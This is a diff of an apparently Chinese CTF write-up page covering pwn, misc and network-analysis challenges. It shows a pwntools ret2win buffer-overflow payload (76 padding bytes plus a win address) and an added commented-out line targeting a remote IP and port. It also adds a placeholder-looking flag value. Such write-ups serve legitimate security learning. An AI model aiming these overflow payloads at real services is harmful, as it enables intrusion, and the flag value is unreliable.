@@ -560,6 +560,7 @@ context<span class="token punctuation">.</span>log_level <span class="token oper
 
 <span class="token comment" spellcheck="true">#ida中有win函数的地址</span>
 win_addr <span class="token operator">=</span> <span class="token number">0x08048488</span>
+<span class="token comment" spellcheck="true">#io = process('101.231.137.47',20011)</span>
 io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./100'</span><span class="token punctuation">)</span>
 payload <span class="token operator">=</span> <span class="token number">76</span><span class="token operator">*</span><span class="token string">'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>
 
@@ -681,6 +682,7 @@ run<span class="token punctuation">(</span><span class="token punctuation">)</sp
 </code></pre>
 <p>运行效果：</p>
 <p><img src="https://i.loli.net/2018/10/29/5bd5e5d2d3670.png" alt=""></p>
+<p>flag:1234567890</p>
 </blockquote>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc1-会飞的狗狗"><a href="#Misc1-会飞的狗狗" class="headerlink" title="Misc1-会飞的狗狗"></a>Misc1-会飞的狗狗</h3><p><img src="https://i.loli.net/2018/10/29/5bd5e67f18c7d.jpg" alt=""></p>
 <p>直接查看文件内容可以得到末尾的base64字符串，接解码得到flag</p>
@@ -719,7 +721,7 @@ flag<span class="token punctuation">{</span>ch1ptune_53ver<span class="token ope
 
 </code></pre>
 <h3 id="Misc5-神秘的文件名-未解出"><a href="#Misc5-神秘的文件名-未解出" class="headerlink" title="Misc5-神秘的文件名(未解出)"></a>Misc5-神秘的文件名(未解出)</h3><blockquote>
-<p> 可以通过binwalk得到一个逆向题。</p>
+<p> 可以通过binwalk得到一个逆向题，较难，未解出。</p>
 </blockquote>
 <h2 id="网络协议分析"><a href="#网络协议分析" class="headerlink" title="网络协议分析"></a>网络协议分析</h2><h3 id="网络协议分析1-数据包里有甜甜圈哦"><a href="#网络协议分析1-数据包里有甜甜圈哦" class="headerlink" title="网络协议分析1-数据包里有甜甜圈哦~"></a>网络协议分析1-数据包里有甜甜圈哦~</h3><blockquote>
 <p>wireshark打开数据包后，依次使用以下过滤规则:<br><code>http contains flag</code></p>
